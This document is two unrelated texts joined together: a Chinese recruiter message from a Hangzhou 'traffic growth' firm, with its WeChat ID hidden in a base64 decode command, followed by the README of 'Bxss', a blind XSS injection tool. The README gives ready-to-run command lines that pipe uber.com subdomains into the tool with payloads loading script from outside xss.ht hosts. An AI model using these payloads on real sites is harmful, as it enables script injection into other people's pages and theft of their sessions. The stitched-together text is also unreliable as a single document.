我是光年实验室高级招聘经理。
我在github上访问了你的开源项目，你的代码超赞。你最近有没有在看工作机会，我们在招软件开发工程师，拉钩和BOSS等招聘网站也发布了相关岗位，有公司和职位的详细信息。
我们公司在杭州，业务主要做流量增长，是很多大型互联网公司的流量顾问。公司弹性工作制，福利齐全，发展潜力大，良好的办公环境和学习氛围。
公司官网是http://www.gnlab.com,公司地址是杭州市西湖区古墩路紫金广场B座，若你感兴趣，欢迎与我联系，
电话是0571-88839161，手机号：18668131388，微信号：echo 'bGhsaGxoMTEyNAo='|base64 -D ,静待佳音。如有打扰，还请见谅，祝生活愉快工作顺利。

![alt text](https://www.secjuice.com/content/images/2018/09/blinded-drib.jpg)
##### Version 1.0

# 😎 Bxss 😎
**A Blind XSS Injector tool**



[![Image from Gyazo](https://i.gyazo.com/61c052718748373ff2d267280e2e69cb.gif)](https://gyazo.com/61c052718748373ff2d267280e2e69cb)

### Features

- Inject Blind XSS payloads into custom headers
- Inject Blind XSS payloads into parameters
- Uses Different Request Methods (PUT,POST,GET,OPTIONS) all at once
- Tool Chaining
- Really fast
- Easy to setup


### Install


**`$ go get -u github.com/ethicalhackingplayground/bxss`**

### Arguments
```


          ____
         |  _ \
         | |_) |_  _____ ___
         |  _ <\ \/ / __/ __|
         | |_) |>  <\__ \__ \
         |____//_/\_\___/___/


        -- Coded by @z0idsec --
  -appendMode
        Append the payload to the parameter
  -concurrency int
        Set the concurrency (default 30)
  -header string
        Set the custom header (default "User-Agent")
  -parameters
        Test the parameters for blind xss
  -payload string
        the blind XSS payload
        
```

[![Image from Gyazo](https://i.gyazo.com/c3f18487b015767f011d0845409c6e5b.gif)](https://gyazo.com/c3f18487b015767f011d0845409c6e5b)


### Blind XSS In Parameters
**`$ subfinder uber.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters`**

### Blind XSS In X-Forwarded-For Header

**`$ subfinder uber.com | gau | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"`**



**If you get a bounty please support by buying me a coffee**

<br>
<a href="https://www.buymeacoffee.com/krypt0mux" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>

